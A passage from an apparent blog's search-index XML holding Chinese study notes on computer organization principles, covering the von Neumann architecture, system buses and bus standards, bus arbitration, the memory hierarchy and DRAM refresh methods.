src="https://cdn.nlark.com/yuque/0/2022/png/26706455/1648724915098-c59064e3-9ad6-4325-948b-fa5b01760db6.png#clientId=uf9f217a2-3aec-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;height=465&amp;id=u3c5c7aba&amp;name=%E5%9B%BE%E7%89%87.png&amp;originHeight=581&amp;originWidth=869&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=45358&amp;status=done&amp;style=none&amp;taskId=u66cb0b00-4df8-4b98-8292-e508e6adb4f&amp;title=&amp;width=695.2" alt="图片.png"></p>]]></content>
      
      
      <categories>
          
          <category> 🔔魔法铃铛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 大学物理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机组成原理</title>
      <link href="/posts/zf108d/"/>
      <url>/posts/zf108d/</url>
      
        <content type="html"><![CDATA[<div class="hide-toggle" style="border: 1px solid #fdf1e7"><div class="hide-button toggle-title" style="background-color: #fdf1e7;"><i class="fas fa-caret-right fa-fw"></i><span>点击查看参考教程 </span></div>    <div class="hide-content"><table><thead><tr><th><strong>参考方向</strong></th><th><strong>教程原贴</strong></th></tr></thead><tbody><tr><td>原教程</td><td><a href="https://www.cnblogs.com/shinianhuanniyijuhaojiubujian/p/10886684.html">计算机组成原理</a></td></tr></tbody></table></div></div><h2 id="第一章计算机系统概论">第一章计算机系统概论</h2><h3 id="计算机系统可分为硬件和软件">计算机系统可分为硬件和软件</h3><p>硬件：计算机的实体，如主机，外设等<br>软件：具有各类特殊功能的信息（程序）组成</p><table><thead><tr><th>软件类型</th><th>定义</th><th>举例</th></tr></thead><tbody><tr><td>系统软件</td><td>用来管理整个计算机系统</td><td>标准程序库，语言处理程序，操作系统，数据库管理系统，网络软件</td></tr><tr><td>应用软件</td><td>按任务需要编制成的各种程序</td><td>科学计算程序，数据处理程序，过程控制程序，事务管理程序</td></tr></tbody></table><h3 id="计算机系统的层次结构">计算机系统的层次结构</h3><p><img src="https://cdn.jsdelivr.net/gh/Cheng1622/image/image.1tpwqghhvkao.webp#crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;id=rg1NY&amp;originHeight=417&amp;originWidth=726&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;title=" alt=""></p><h3 id="计算机系统的体系结构">计算机系统的体系结构</h3><table><thead><tr><th>分类</th><th>区别</th><th>定义</th></tr></thead><tbody><tr><td>计算机体系结构</td><td>有无乘法指令</td><td>程序员见到的计算机系统的属性，即概念性的结构和功能特性（指令系统，数据类型，寻址技术，I/O 机理）</td></tr><tr><td>计算机组成</td><td>如何实现乘法指令</td><td>实现计算机体系结构所体现的属性（具体指令的实现）</td></tr></tbody></table><h3 id="冯-诺依曼计算机的特点">冯.诺依曼计算机的特点</h3><ol><li>计算机由运算器，存储器，控制器，输入设备和输出设备五大部分组成</li><li>指令和数据以同等地位存放与存储器内，并可按地址寻访</li><li>指令和数据用二进制表示</li><li>指令由操作码和地址码组成</li><li>存储程序</li><li>以运算器为中心</li></ol><h3 id="冯-诺依曼计算机硬件框图">冯.诺依曼计算机硬件框图</h3><p><img src="https://cdn.jsdelivr.net/gh/Cheng1622/image/image.7cio0eva12w0.webp#crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;id=HpJ8K&amp;originHeight=451&amp;originWidth=854&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;title=" alt=""></p><h3 id="现代计算机硬件框图">现代计算机硬件框图</h3><p>现代计算机以<code>存储器</code>为中心</p><p><img src="https://cdn.jsdelivr.net/gh/Cheng1622/image/image.4ckzcnm2u7a0.webp#crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;id=u70dn&amp;originHeight=414&amp;originWidth=511&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;title=" alt=""></p><h3 id="指令格式">指令格式</h3><table><thead><tr><th>操作码</th><th>操作性质</th><th>具体内容</th></tr></thead><tbody><tr><td>000001</td><td>取数</td><td>[a] -&gt; ACC</td></tr><tr><td>000010</td><td>存数</td><td>[ACC] -&gt; b</td></tr><tr><td>000011</td><td>加</td><td>[ACC] + [c] -&gt; ACC</td></tr><tr><td>000100</td><td>乘</td><td>[ACC] x [d] -&gt; ACC</td></tr><tr><td>000101</td><td>打印</td><td>[a] -&gt; 打印机</td></tr></tbody></table><h3 id="存储器的基本组成">存储器的基本组成</h3><table><thead><tr><th>组成</th><th>解释</th></tr></thead><tbody><tr><td>存储单元</td><td>存放一串二进制代码</td></tr><tr><td>存储字</td><td>存储单元中二进制代码的组合</td></tr><tr><td>存储字长</td><td>存储单元中二进制代码的位数每个存储单元赋予一个地址号</td></tr><tr><td>MAR</td><td>存储器地址寄存器，反映存储单元的个数 <code>2的n次方</code></td></tr><tr><td>MDR</td><td>存储器数据寄存器，反映存储字长 <code>n</code></td></tr></tbody></table><h3 id="运算器基本组成">运算器基本组成</h3><table><thead><tr><th>寄存器，操作数，运算</th><th>加法</th><th>减法</th><th>乘法</th><th>除法</th></tr></thead><tbody><tr><td>ACC</td><td>被加数及和</td><td>被减数及差</td><td>乘积高位</td><td>被除数及余数</td></tr><tr><td>MQ</td><td></td><td></td><td>乘数及乘积低位</td><td>商</td></tr><tr><td>X</td><td>加数</td><td>减数</td><td>被乘数</td><td>除数</td></tr></tbody></table><h3 id="控制器的基本组成">控制器的基本组成</h3><table><thead><tr><th>简称</th><th>意义</th><th>作用</th><th>解释</th></tr></thead><tbody><tr><td>PC</td><td>取指令</td><td>取指，访存</td><td>存放当前欲执行指令的地址，具有计数功能(PC)+1-&gt;PC</td></tr><tr><td>IR</td><td>分析指令</td><td>取指，访存</td><td>存放当前欲执行的指令</td></tr><tr><td>CU</td><td>执行指令</td><td>执行，访存</td><td>控制单元</td></tr></tbody></table><h3 id="以取数指令为例">以取数指令为例</h3><p><img src="https://cdn.jsdelivr.net/gh/Cheng1622/image/image.4gxxlyisw840.webp#crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;id=kNDZw&amp;originHeight=351&amp;originWidth=643&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;title=" alt=""></p><h3 id="计算机硬件的主要技术指标">计算机硬件的主要技术指标</h3><ol><li>机器字长：CPU 一次能处理数据的位数，与 CPU 中的寄存器位数有关。</li><li>运算速度：<br>① 主频<br>② 吉普森法(每条指令的执行的时间以及他们在全部操作中所占的百分比 TM=∑ni=1fiti)（<code>fi不同应用不相同</code>）<br>③MIPS(百万条指令每秒)<br>④CPI(执行一条指令所需时钟周期数)<br>⑤FLOPS(每秒浮点运算次数)</li><li>存储容量(存放二进制信息的总位数)</li></ol><table><thead><tr><th>分类</th><th>组成</th></tr></thead><tbody><tr><td>主存容量</td><td>存储单元 × 字节数</td></tr><tr><td>主存容量</td><td>字节数</td></tr><tr><td>辅存容量</td><td>字节数</td></tr></tbody></table><h1>第三章 系统总线</h1><p>计算机系统五大部件之间的互连的方式有两种 1.分散连接：各部件之间使用单独的连线 2.总线连接：将各部件连到一组公共信息传输线上<br>总线：连接各个部件的信息传输线，是各个部件共享的传输介质<br>总线传输特点：某一时刻只能有一路信息在总线上传输，即分时使用。为了减轻总线负载，总线上的部件应通过三态驱动缓冲电路与总线相连<br>总线上信息的传输：</p><h6 id="串行：每条线可一位一位的传输二进制代码，一串二进制代码可在一段时间内逐一传输完成">串行：每条线可一位一位的传输二进制代码，一串二进制代码可在一段时间内逐一传输完成</h6><h6 id="并行：若干条传输线同时传输若干条二进制代码">并行：若干条传输线同时传输若干条二进制代码</h6><h5 id="面向-CPU-的双总线结构框图">面向 CPU 的双总线结构框图</h5><p><img src="https://cdn.nlark.com/yuque/0/2022/png/26706455/1648785521902-ba890e9d-29d9-4815-bc50-8b659eb0ae53.png#clientId=u1bdf1067-a80d-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;id=u3c100ed2&amp;originHeight=327&amp;originWidth=597&amp;originalType=url&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;taskId=u03f6081e-02ae-4230-bc82-575019fa2e1&amp;title=" alt=""></p><h5 id="单总线结构框图">单总线结构框图</h5><p><img src="https://cdn.nlark.com/yuque/0/2022/png/26706455/1648785521911-47b8642d-7b61-4d2a-825b-175250b89a3c.png#clientId=u1bdf1067-a80d-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;id=uc4f0ad26&amp;originHeight=338&amp;originWidth=608&amp;originalType=url&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;taskId=u848491e1-1a24-47bc-9ead-b0f05fcd3e1&amp;title=" alt=""></p><h5 id="以存储器为中心的双总线结构框图">以存储器为中心的双总线结构框图</h5><p><img src="https://cdn.nlark.com/yuque/0/2022/png/26706455/1648785521913-99b22ba8-de21-4ac6-a0a3-b5d2c4fcfa58.png#clientId=u1bdf1067-a80d-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;id=u50a95074&amp;originHeight=329&amp;originWidth=620&amp;originalType=url&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;taskId=u84d76501-3b57-4d72-b359-e3701dbc1c0&amp;title=" alt=""></p><table><thead><tr><th>总线分类</th><th>解释</th></tr></thead><tbody><tr><td>片内总线</td><td>芯片内部的总线,如寄存器与寄存器之间,寄存器与算逻单元 ALU 之间。</td></tr><tr><td>系统总线</td><td>计算机各部件之间的信息传输线(CPU,主存,I/O 设备等)</td></tr><tr><td>系统总线-数据总线</td><td>双向传输,其位数与机器字长,存储字长有关</td></tr><tr><td>系统总线-地址总线</td><td>单向，与存储地址,I/O 地址有关</td></tr><tr><td>系统总线-控制总线</td><td>单向，发出各种控制信号。有出(存储器读、存储器写总线允许、中断确认),有入(中断请求、总线请求)</td></tr><tr><td>通信总线</td><td>用于计算机系统之间或计算机系统与其他系统（如控制仪表、移动通信等）之间的通信。分为串行通信和并行通信</td></tr></tbody></table><h5 id="总线物理实现">总线物理实现</h5><p><img src="https://cdn.nlark.com/yuque/0/2022/png/26706455/1648785521903-d602d3b5-cd70-48a4-ba82-d374d46f46f0.png#clientId=u1bdf1067-a80d-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;id=u3b21cdd9&amp;originHeight=291&amp;originWidth=590&amp;originalType=url&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;taskId=u3be303de-b769-477c-8a49-16c26c526bd&amp;title=" alt=""></p><h5 id="总线特性">总线特性</h5><table><thead><tr><th>总线特性</th><th></th></tr></thead><tbody><tr><td>机械特性</td><td>指总线在机械连接方式上的一些性能，尺寸，形状，引脚的个数以及排列的顺序，接头处的可靠接触</td></tr><tr><td>电气特性</td><td>总线的每一根传输线上信号的传输方向和有效的电平范围</td></tr><tr><td>功能特性</td><td>每根传输线的功能。地址总线用来指出地址码；数据总线传递数据；控制总线发出控制信号</td></tr><tr><td>时间特性</td><td>信号的时序关系</td></tr></tbody></table><h5 id="总线性能指标">总线性能指标</h5><table><thead><tr><th>性能</th><th>指标</th></tr></thead><tbody><tr><td>总线宽度</td><td>数据线分根数，用 bit</td></tr><tr><td>总线带宽</td><td>每秒传输的最大字节数(MBps)</td></tr><tr><td>时钟同步/异步</td><td>同步，异步</td></tr><tr><td>总线复用</td><td>地址线与数据线复用</td></tr><tr><td>信号线数</td><td>地址线，数据线和控制线的<strong>总和</strong></td></tr><tr><td>总线控制方式</td><td>突发，自动，仲裁，逻辑，计数</td></tr><tr><td>其他指标</td><td>负载能力（驱动能力），电源电压，总线宽度能否扩展等</td></tr></tbody></table><h5 id="总线标准">总线标准</h5><h5 id="总线标准：系统与各模块，模块与模块之间的一个互连的标准界面">总线标准：系统与各模块，模块与模块之间的一个互连的标准界面</h5><h5 id="为什么要设立总线标准：为了使设计简化，模块生产批量化，确保其性能稳定，质量可靠，实现可移化，便于维护。">为什么要设立总线标准：为了使设计简化，模块生产批量化，确保其性能稳定，质量可靠，实现可移化，便于维护。</h5><table><thead><tr><th>总线标准</th><th>数据线</th><th>地址线</th><th>总线时钟</th><th>带宽</th><th>特性</th></tr></thead><tbody><tr><td>ISA</td><td>16</td><td>24</td><td>8MHz(独立)</td><td>16MBps</td><td></td></tr><tr><td>EISA</td><td>32</td><td>32</td><td>8MHz(独立)</td><td>33MBps</td><td></td></tr><tr><td>VESA(VL-BUS)</td><td>32</td><td></td><td>33MHz(CPU)</td><td>133MBps</td><td></td></tr><tr><td>PCI</td><td>32 64</td><td></td><td>33MHz(独立)66MHz(独立)</td><td>132MBps528MBps</td><td>良好的兼容性，即插即用，支持多主设备，具有与处理器和存储器子系统完全并行操作的能力，提供数据和地址奇偶校验，可扩充，软件兼容性好，支持两种电压标准 5V、3.3V，采用多路复用</td></tr><tr><td>AGP</td><td>32</td><td></td><td>66.7MHz(独立)133MHz(独立)</td><td>266MBps533MBps</td><td></td></tr><tr><td>RS-232C</td><td>串行通信总线标准</td><td></td><td>数据终端设备（计算机）和数据通信设备（调制解调器）之间的标准接口</td><td></td><td></td></tr><tr><td>USB</td><td>串行接口总线标准</td><td></td><td>普通无屏蔽双绞线带屏蔽双绞线最高</td><td>1.5 Mbps(USB1.0)12Mbps(USB1.0)480Mbps(USB2.0)</td><td>具有真正的即插即用，很强的连接能力，数据传输率，标准统一</td></tr></tbody></table><h2 id="总线结构">总线结构</h2><h3 id="单总线结构">单总线结构</h3><p><img src="https://cdn.nlark.com/yuque/0/2022/png/26706455/1648785521880-bf9d0e02-95d7-4dec-875e-117cc5f422e4.png#clientId=u1bdf1067-a80d-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;id=u74b918c5&amp;originHeight=338&amp;originWidth=608&amp;originalType=url&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;taskId=u269e6e93-f61f-4e44-983e-9c77ccfc8af&amp;title=" alt=""></p><h3 id="多总线结构">多总线结构</h3><ol><li>双总线结构</li></ol><p><img src="https://cdn.nlark.com/yuque/0/2022/png/26706455/1648785522821-7ef3a319-b246-42b5-b2b5-f8f6e2c76ab3.png#clientId=u1bdf1067-a80d-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;id=u82e24841&amp;originHeight=338&amp;originWidth=608&amp;originalType=url&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;taskId=u46f195f6-aef6-418d-8709-5c07287ed7a&amp;title=" alt=""></p><ol start="2"><li>三总线结构</li></ol><p><img src="https://cdn.nlark.com/yuque/0/2022/png/26706455/1648785522827-eafd4cc9-cf44-4f40-bd46-d952f1b921c5.png#clientId=u1bdf1067-a80d-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;id=ufb8855b6&amp;originHeight=307&amp;originWidth=636&amp;originalType=url&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;taskId=u0652e3f4-b98e-4017-9219-135ad25f301&amp;title=" alt=""></p><ol start="3"><li>三总线结构又一</li></ol><p><img src="https://cdn.nlark.com/yuque/0/2022/png/26706455/1648785522845-5be7a871-b4fd-41a2-9a04-262fcd1ba418.png#clientId=u1bdf1067-a80d-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;id=ue5772d06&amp;originHeight=345&amp;originWidth=616&amp;originalType=url&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;taskId=udbf41bfe-d7fc-4b45-8ca7-1076b53207b&amp;title=" alt=""></p><ol start="4"><li>四总线结构</li></ol><p><img src="https://cdn.nlark.com/yuque/0/2022/png/26706455/1648785522836-8f7fc71f-defe-47c5-89cf-d31e9d435d97.png#clientId=u1bdf1067-a80d-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;id=u9aebffde&amp;originHeight=370&amp;originWidth=625&amp;originalType=url&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;taskId=u59cfaa9a-6914-4b08-b847-228a2c9e587&amp;title=" alt=""></p><h2 id="总线控制">总线控制</h2><h4 id="总线判优控制">总线判优控制</h4><ol><li>总线上所连接的各类设备，按其对总线有无控制功能分为<code>主设备(模块)和从设备(模块)</code>。</li><li><code>主设备</code>对总线有控制权，<code>从设备</code>只能响应从主设备发来的总线命令，对总线没有控制权。</li><li>总线优判控制分为集中式和分布式两种<table><thead><tr><th>集中式种类</th><th>特点</th></tr></thead><tbody><tr><td>链式查询</td><td>连线简单，易于扩充，对电路故障最敏感</td></tr><tr><td>计数器定时查询</td><td>优先级设置较灵活，对故障不敏感，连线及控制过程较复杂</td></tr><tr><td>独立请求</td><td>响应速度快，优先级次序控制灵活，但连线多，总线控制复杂</td></tr></tbody></table></li></ol><h4 id="总线通信">总线通信</h4><table><thead><tr><th>通信方式</th><th>特点</th><th>适用场合</th></tr></thead><tbody><tr><td>同步通信</td><td>指由统一时钟控制的通信，控制方式简单，灵活性差，当系统中各部件工作速度差异较大时，总线工作效率明显下降</td><td>一般用于总线长度较短，各部件存取时间比较一致的场合</td></tr><tr><td>异步通信</td><td>指没有统一时钟控制的通信，部件采用应答方式进行联系，控制方式较同步复杂，灵活性高，当系统中各部件工作速度差异较大时，有利于提高总线工作效率</td><td>又分为不互锁，半互锁，全互锁</td></tr><tr><td>半同步通信</td><td>既可以像同步通信一样由统一时钟控制，又可以像异步通信一样允许传输时间不一致，工作效率介于两者之间</td><td></td></tr><tr><td>分离式通信</td><td>1.各模块欲占用总线使用权必须提出申请 2.在得到总线使用权后，主模块在限定的时间内向对方传送信息，采用同步方式，不再等待对方回答信号 3.各模块在准备数据的过程中都不占用总线，使总线可以接受其他模块的请求 4.总线被占用时都在做有效工作，或者通过它发送命令，或者通过它传送数据，不存在空闲等待时间，充分的利用了总线的有效占用，从而实现了总线在多个主，从模块间进行交叉重叠并行传送。</td><td>大型计算机系统</td></tr></tbody></table><h6 id="同步式数据输入传输">同步式数据输入传输</h6><p><img src="https://cdn.nlark.com/yuque/0/2022/png/26706455/1648785522777-2aca90f3-6424-424d-bf75-838b77fc61f2.png#clientId=u1bdf1067-a80d-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;id=u7b7dc40d&amp;originHeight=360&amp;originWidth=645&amp;originalType=url&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;taskId=ufb863e41-5936-434b-aad5-2523a54958c&amp;title=" alt=""></p><h5 id="同步式数据输出传输">同步式数据输出传输</h5><p><img src="https://cdn.nlark.com/yuque/0/2022/png/26706455/1648785523613-3a9b4d5d-9238-4d6f-9999-236a0319fbae.png#clientId=u1bdf1067-a80d-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;id=uf25d3381&amp;originHeight=355&amp;originWidth=633&amp;originalType=url&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;taskId=u96f7854d-ea1f-42d3-a49e-99a94d7a49d&amp;title=" alt=""></p><h1>第四章 存储器</h1><h4 id="存储器分类">存储器分类</h4><p><img src="https://cdn.nlark.com/yuque/0/2022/png/26706455/1648785523678-7e30e11e-ec36-4056-8cf4-53b25ba4d36b.png#clientId=u1bdf1067-a80d-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;id=u07b984c0&amp;originHeight=396&amp;originWidth=556&amp;originalType=url&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;taskId=u0b4e41ad-f095-4472-9173-6d2ee75267c&amp;title=" alt=""></p><h4 id="存储器速度容量和价位的关系">存储器速度容量和价位的关系</h4><p><img src="https://cdn.nlark.com/yuque/0/2022/png/26706455/1648785523631-46b75b83-5654-4513-a81d-688f207f2cff.png#clientId=u1bdf1067-a80d-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;id=uddf2be62&amp;originHeight=292&amp;originWidth=630&amp;originalType=url&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;taskId=u794019de-c2b1-4732-af6f-7ac9723cb93&amp;title=" alt=""></p><h4 id="缓存主存层次和主存辅存层次">缓存主存层次和主存辅存层次</h4><p><img src="https://cdn.nlark.com/yuque/0/2022/png/26706455/1648785523656-ce7329e8-bde5-48f0-875f-781780986866.png#clientId=u1bdf1067-a80d-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;id=u98102e43&amp;originHeight=385&amp;originWidth=622&amp;originalType=url&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;taskId=u96920c37-d612-49b8-b9e3-731a1b46b85&amp;title=" alt=""></p><h6 id="缓存主存–解决-CPU-和主存速度不匹配的问题">缓存主存–解决 CPU 和主存速度不匹配的问题</h6><h6 id="主存辅存–解决存储系统的容量问题">主存辅存–解决存储系统的容量问题</h6><h4 id="主存的主要技术指标">主存的主要技术指标</h4><h5 id="存储容量">存储容量</h5><h6 id="指主存能存放二进制代码的总位数">指主存能存放二进制代码的总位数</h6><h6 id="存储容量-存储单元个数-存储字长">存储容量=存储单元个数*存储字长</h6><h6 id="存储容量-存储单元个数-存储字长-8">存储容量=存储单元个数*存储字长/8</h6><h5 id="存储速度">存储速度</h5><h6 id="由存取时间和存取周期来表示，存取时间指存储器的访时间，存取周期指存储器进行两次独立的存储器操作所需的最小时间间隔">由存取时间和存取周期来表示，存取时间指存储器的访时间，存取周期指存储器进行两次独立的存储器操作所需的最小时间间隔</h6><h5 id="存储器带宽">存储器带宽</h5><h6 id="单位时间内存储器存取的信息量，单位可以用字-秒或字节-秒或位-秒。提高存储器带宽可以-1-缩短存取周期-2-增加存储字长，使每个存取周期可读-写更多的二进制位数-3-增加存储体">单位时间内存储器存取的信息量，单位可以用字/秒或字节/秒或位/秒。提高存储器带宽可以 1.缩短存取周期 2.增加存储字长，使每个存取周期可读/写更多的二进制位数 3.增加存储体</h6><hr><h5 id="静态-RAM">静态 RAM</h5><p><img src="https://cdn.nlark.com/yuque/0/2022/png/26706455/1648785523652-ba663649-b5b0-439a-a2f8-b46d1d930721.png#clientId=u1bdf1067-a80d-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;id=uacd71e1d&amp;originHeight=361&amp;originWidth=632&amp;originalType=url&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;taskId=ua41c9121-7405-46c5-85ac-08576c91693&amp;title=" alt=""></p><h5 id="动态-RAM">动态 RAM</h5><h6 id="动态-RAM-通过电容来存储电荷的原理来存储信息，电容上有足够多的电荷表示存-1，无电荷表示存-0，电容上电荷一般只能维持-1——2ms，因此，必须在-2ms-内对其所存储单元恢复一次原状态，这个过程称为再生或刷新。">动态 RAM 通过电容来存储电荷的原理来存储信息，电容上有足够多的电荷表示存 1，无电荷表示存 0，电容上电荷一般只能维持 1——2ms，因此，必须在 2ms 内对其所存储单元恢复一次原状态，这个过程称为再生或刷新。</h6><h5 id="动态-RAM-时序图">动态 RAM 时序图</h5><h6 id="先由RAS¯¯¯¯¯¯¯¯¯¯¯">先由<em>RAS</em>¯¯¯¯¯¯¯¯¯¯¯</h6><h6 id="将行地址送入行地址缓存器，再由CAS¯¯¯¯¯¯¯¯¯¯¯">将行地址送入行地址缓存器，再由<em>CAS</em>¯¯¯¯¯¯¯¯¯¯¯</h6><h6 id="将列地址送入列地址缓存器，因此CAS¯¯¯¯¯¯¯¯¯¯¯">将列地址送入列地址缓存器，因此<em>CAS</em>¯¯¯¯¯¯¯¯¯¯¯</h6><h6 id="滞后于RAS¯¯¯¯¯¯¯¯¯¯¯">滞后于<em>RAS</em>¯¯¯¯¯¯¯¯¯¯¯</h6><h6 id="的时间必须要超过其规定值">的时间必须要超过其规定值</h6><h6 id="RAS¯¯¯¯¯¯¯¯¯¯¯"><em>RAS</em>¯¯¯¯¯¯¯¯¯¯¯</h6><h6 id="和CAS¯¯¯¯¯¯¯¯¯¯¯">和<em>CAS</em>¯¯¯¯¯¯¯¯¯¯¯</h6><h6 id="正、负电平的宽度要大于规定值，以保证芯片内部正常工作">正、负电平的宽度要大于规定值，以保证芯片内部正常工作</h6><h5 id="行地址对RAS¯¯¯¯¯¯¯¯¯¯¯">行地址对<em>RAS</em>¯¯¯¯¯¯¯¯¯¯¯</h5><h5 id="的下降沿以及列地址对CAS¯¯¯¯¯¯¯¯¯¯¯">的下降沿以及列地址对<em>CAS</em>¯¯¯¯¯¯¯¯¯¯¯</h5><h5 id="的下降沿应有足够的地址建立时间和地址保持时间，已确定行、列地址均能准确写入芯片。">的下降沿应有足够的地址建立时间和地址保持时间，已确定行、列地址均能准确写入芯片。</h5><h5 id="动态-RAM-读时序">动态 RAM 读时序</h5><p>行地`<em>RAS</em>¯¯¯¯¯¯¯¯¯¯¯<br>有效<br>写允许<em>WE</em>¯¯¯¯¯¯¯¯¯ 有效（高）<br>列地址<em>CAS</em>¯¯¯¯¯¯¯¯¯¯¯ 有效<br>数据<em>DOUT</em><br>有效</p><h5 id="动态-RAM-写时序">动态 RAM 写时序</h5><p>行地址<em>RAS</em>¯¯¯¯¯¯¯¯¯¯¯<br>有效<br>写允许<em>WE</em>¯¯¯¯¯¯¯¯¯ 有效（低）<br>数据<em>DIN</em>有<br>列地址<em>CAS</em>¯¯¯¯¯¯¯¯¯¯¯<br>有效</p><h5 id="动态-RAM-刷新">动态 RAM 刷新</h5><p><strong>刷新实质是将原信息读出，在由刷新放大器形成原信息并重新写入的再生过程</strong></p><h6 id="集中刷新–在规定的一个刷新周期内，对全部存储单元集中一段时间逐行进行刷新，此刻必须停止读-写操作。之后剩余的时间进行读写操作或维持信息。因此存在“死时间”或访存“死区”。">集中刷新–在规定的一个刷新周期内，对全部存储单元集中一段时间逐行进行刷新，此刻必须停止读/写操作。之后剩余的时间进行读写操作或维持信息。因此存在“死时间”或访存“死区”。</h6><p><img src="https://cdn.nlark.com/yuque/0/2022/png/26706455/1648785524229-2fc030da-0179-47c6-af7c-44797edf77ce.png#clientId=u1bdf1067-a80d-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;id=u9bfeac50&amp;originHeight=392&amp;originWidth=597&amp;originalType=url&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;taskId=uddade78b-c5cc-413d-aad9-978ee36aa38&amp;title=" alt=""></p><h6 id="分散刷新–对每行存储单元的刷新分散到每个存取周期内完成。其中把机器的周期tc">分散刷新–对每行存储单元的刷新分散到每个存取周期内完成。其中把机器的周期<em>tc</em></h6><h6 id="分成两段，前半段tM">分成两段，前半段<em>tM</em></h6><h6 id="用来读写或维持信息，后半段tR">用来读写或维持信息，后半段<em>tR</em></h6><h6 id="用来刷新-不存在死时间，但存取周期长">用来刷新,不存在死时间，但存取周期长</h6><p><img src="https://cdn.nlark.com/yuque/0/2022/png/26706455/1648785524461-067f313b-85df-4ccc-9dcf-486c5e05489d.png#clientId=u1bdf1067-a80d-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;id=ub224ba7f&amp;originHeight=412&amp;originWidth=617&amp;originalType=url&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;taskId=u4e8536e9-d33c-4bdf-89aa-1815d260688&amp;title=" alt=""></p><h6 id="异步刷新–异步刷新为前两种的结合，既可以缩短死时间，又可以充分利用-2ms-的特点">异步刷新–异步刷新为前两种的结合，既可以缩短死时间，又可以充分利用 2ms 的特点</h6><p><img src="https://cdn.nlark.com/yuque/0/2022/png/26706455/1648785524354-6f20f99a-89b5-4955-8fdb-b4cd88466262.png#clientId=u1bdf1067-a80d-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;id=u3179f672&amp;originHeight=381&amp;originWidth=599&amp;originalType=url&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;taskId=ubb747b34-f99e-4936-93c5-febab5aecb8&amp;title=" alt=""></p><h5 id="动态-RAM-和静态-RAM-的比较">动态 RAM 和静态 RAM 的比较</h5><h6 id="在同样大小的芯片中，动态-RAM-的集成度远高于静态-RAM。">在同样大小的芯片中，动态 RAM 的集成度远高于静态 RAM。</h6><h6 id="动态-RAM-行、列地址按先后顺序输送，减少了芯片的引脚，封装尺寸也减少">动态 RAM 行、列地址按先后顺序输送，减少了芯片的引脚，封装尺寸也减少</h6><h6 id="动态-RAM-的功耗比静态-RAM-小">动态 RAM 的功耗比静态 RAM 小</h6><h6 id="动态-RAM-的价格比静态-RAM-的价格便宜">动态 RAM 的价格比静态 RAM 的价格便宜</h6><h6 id="由于使用动态元件-电容-，因此它的速度比静态-RAM-低">由于使用动态元件(电容)，因此它的速度比静态 RAM 低</h6><h6 id="动态-RAM-需要再生，故需要配置再生电路，也需要消耗一部分功率。通常，容量不大的高速缓存器大多用静态-RAM-实现">动态 RAM 需要再生，故需要配置再生电路，也需要消耗一部分功率。通常，容量不大的高速缓存器大多用静态 RAM 实现</h6><hr><h3 id="存储器与-CPU-的连接">存储器与 CPU 的连接</h3><h5 